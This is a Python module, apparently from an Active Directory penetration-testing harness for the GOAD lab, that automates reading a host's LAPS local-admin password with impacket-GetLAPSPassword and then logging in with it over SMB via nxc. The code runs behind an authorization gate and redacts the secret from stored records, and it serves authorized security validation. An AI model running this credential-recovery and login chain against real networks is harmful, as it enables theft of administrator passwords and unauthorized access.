"""LAPS validation executor -- FULL (T1a).

Encodes the #66146 LAPS recipe, parameterized and non-mutating:

    impacket-GetLAPSPassword <auth> -computer <host>   -> ms-Mcs-AdmPwd (secret)
    nxc smb <host> -u <local_admin> -p <laps_pw> --local-auth  -> authn_success

The terminal proof is a *local-admin login* with the recovered LAPS password.
The password itself is a recovered secret: it lives only in-process, is masked
in every stored argv, and never reaches the receipt; the terminal fact carries a
non-secret token over public identifiers only.

Two honesty points carried from #66146:

* ``verified_recipe = False`` -- the ms-Mcs-AdmPwd *read* is proven, but the
  *login* was inconclusive on GOAD (the AD attribute is not synced to the
  member's local SAM, a lab quirk). The executor still attempts the full chain
  and records the real login predicate; when the quirk makes login fail the
  harness correctly returns ``not-proved`` -- the executor never fakes it.
* The read is a **gated** op: ms-Mcs-AdmPwd read was denied once by the
  classifier (#66119). A denied gate yields an incomplete receipt the harness
  reads as ``inconclusive`` -- the executor surfaces the denial, never works
  around it.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): LAPS keys on
``{host_id}`` (members srv02/srv03). ``target_identity`` resolves the finding
host through ``config.host_aliases`` so the receipt target carries that
``host_id``.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, SecretReveal)


# GetLAPSPassword success markers: a recovered managed-password / LAPS line.
_RE_LAPS_RECOVERED = re.compile(r"(ms-?Mcs-?AdmPwd|LAPS|Managed Password|Password)", re.I)
# nxc local-auth success markers.
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)
# Key-value form: "LAPS password for HOST: <pw>" / "Password: <pw>" / "Password = <pw>".
_RE_LAPS_PW_KV = re.compile(r"Password(?:\s+for\s+\S+)?\s*[:=]\s*(\S+)", re.I)
# A header line naming a Password column alongside a host/account column.
_RE_LAPS_TABLE_HDR = re.compile(
    r"(computer|host|account|username|name)", re.I)


class LAPSExecutor(ValidationExecutor):
    recovers_credentials = True
    technique = "LAPS"
    technique_class = "laps"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = False      # read proved; login inconclusive on GOAD (#66146)
    recipe_ref = ("#66146 LAPS = impacket-GetLAPSPassword -> login (READ proved braavos; "
                  "login inconclusive: AD attr not synced to local SAM in GOAD)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        host = finding.host or ""
        return [
            ParamSpec(
                name="target_host", kind="target_host",
                description="Member host whose LAPS-managed local-admin password is "
                            "read, then used to log in.",
                recommended=host,
                rationale="The host of the aranum LAPS finding.",
            ),
            ParamSpec(
                name="local_admin", kind="principal_name",
                description="Local administrator account to authenticate as with the "
                            "recovered LAPS password (--local-auth).",
                recommended="administrator",
                rationale="The default LAPS-managed local admin; override for a "
                          "renamed admin account.",
            ),
        ]

    def target_identity(self, ctx, finding, params) -> dict[str, Any]:
        host = params["target_host"].value or finding.host or ""
        return ctx.config.resolve_target_identity(host) if host else dict(finding.entity)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        return [
            f"impacket-GetLAPSPassword -computer {v['target_host']} <auth>   (gated read)",
            f"nxc smb {v['target_host']} -u {v['local_admin']} -p *** --local-auth   (= authn proof)",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self, cfg) -> tuple[str, list[str]]:
        target = f"{cfg.domain}/{cfg.username or ''}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        host = v["target_host"]
        local_admin = v["local_admin"]
        op_target, op_extra = self._op_auth_target(cfg)

        # Private recovery channel, populated before any downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish(*args):
            artifact.update(self._artifact(*args))
            return artifact

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) read ms-Mcs-AdmPwd (gated, #66119) ----------------------------
        verdict = ctx.authorizer.authorize("laps_read", {"host": host})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "laps_read"
            errors.append("gate_denied:laps_read")
            return finish(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "laps_read"

        read_argv = ["impacket-GetLAPSPassword", op_target, "-dc-ip", cfg.dc_ip,
                     "-computer", host, *op_extra]
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s)
        out = res.stdout or ""
        laps_pw = self._parse_laps_pw(out)
        if laps_pw:
            artifact["_reveal"].append(SecretReveal(
                self.technique, "password", f"{host}\\{local_admin}", laps_pw))
        read_ok = bool(laps_pw) or bool(_RE_LAPS_RECOVERED.search(out))
        record("laps_read", read_argv, res, read_ok,
               note="recovered" if read_ok else "no password")
        if not laps_pw:
            # Read succeeded but we could not parse a usable password to log in with.
            errors.append("laps_no_password" if not read_ok else "laps_pw_unparsed")
            return finish(steps, gate, mutation, None, False, errors)

        # 2) local-admin login = the terminal proof -----------------------
        login_argv = ["nxc", "smb", host, "-u", local_admin, "-p", laps_pw, "--local-auth"]
        res = ctx.runner.run(login_argv, timeout=cfg.tool_timeout_s)
        lout = res.stdout or ""
        login_ok = bool(_RE_NXC_PWNED.search(lout) or _RE_NXC_AUTH_OK.search(lout))
        record("local_login", login_argv, res, login_ok,
               note="pwn3d" if _RE_NXC_PWNED.search(lout) else "auth" if login_ok else
               "login failed (GOAD LAPS-SAM sync quirk?)")
        if not login_ok:
            errors.append("local_login_failed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=login_ok, impersonated=local_admin,
            predicate=f"local-admin login on {host} with recovered LAPS password",
            proof_token=proof.proof_token("LAPS", host, local_admin,
                                          "pwn3d" if _RE_NXC_PWNED.search(lout) else "auth"),
            extra={"host": host},
        )
        complete = login_ok
        return finish(steps, gate, mutation, terminal_fact, complete, errors)

    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _parse_laps_pw(stdout: str) -> Optional[str]:
        """Recover the LAPS password from GetLAPSPassword output.

        UNVERIFIED ASSUMPTION (pin against the real tool during the lab run): the
        tool emits either a key-value line (``LAPS password for H: <pw>`` /
        ``Password: <pw>``) or a single-token-per-column table whose header names
        a ``Password`` column; this reads the password from that column. If the
        real output differs, the login step gets no password and the chain
        honestly reports incomplete (never a fabricated proof).
        """
        # 1) key-value forms.
        m = _RE_LAPS_PW_KV.search(stdout)
        if m:
            return m.group(1)
        # 2) table form: a header naming both a Password column and a host/account
        #    column, then the first data row's Password-column token.
        lines = stdout.splitlines()
        for i, line in enumerate(lines):
            low = line.lower()
            if "password" not in low or not _RE_LAPS_TABLE_HDR.search(line):
                continue
            tokens = line.split()
            pw_col = next((j for j, t in enumerate(tokens) if "password" in t.lower()), None)
            if pw_col is None:
                continue
            for data in lines[i + 1:]:
                if not data.strip() or set(data.strip()) <= set("-| "):
                    continue  # blank / separator row
                parts = data.split()
                if len(parts) > pw_col:
                    return parts[pw_col]
            break
        return None

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
